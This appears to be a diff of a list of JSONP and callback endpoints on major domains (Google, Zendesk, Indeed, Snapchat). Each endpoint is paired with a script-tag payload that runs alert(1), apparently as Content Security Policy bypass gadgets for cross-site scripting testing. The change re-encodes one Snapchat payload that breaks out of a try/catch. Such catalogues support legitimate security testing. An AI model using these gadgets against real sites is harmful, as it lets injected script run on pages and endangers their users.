@@ -189,7 +189,7 @@ tagmanager.google.com	<script src="https://tagmanager.google.com/debug/api/vtinf
 thiscanbeanything.zendesk.com	<script src="https://thiscanbeanything.zendesk.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>
 track.consensus.app  <script src="https://track.consensus.app/track/?callback=alert(1)"></script>
 tr.indeed.com	<script src="https://tr.indeed.com/m/newjobs?q=&l=&ts=1734358724474&callback=alert"></script>
-tr.snapchat.com	<script src="https://tr.snapchat.com/config/com/')%7Dcatch(e)%7B%7D%7D()%3balert(1)%2f%2f.js"></script>
+tr.snapchat.com	<script src="https://tr.snapchat.com/config/com/%27%29%3B%7Dcatch%28e%29%7B%7D%7D%3Balert%281%29%3B%21function%28%29%7Btry%7B%28%27.js"></script>
 translate-pa.googleapis.com  <script src="https://translate-pa.googleapis.com/v1/supportedLanguages?callback=alert(1)"></script>
 translate.google.com	<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>
 translate.googleapis.com	<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>
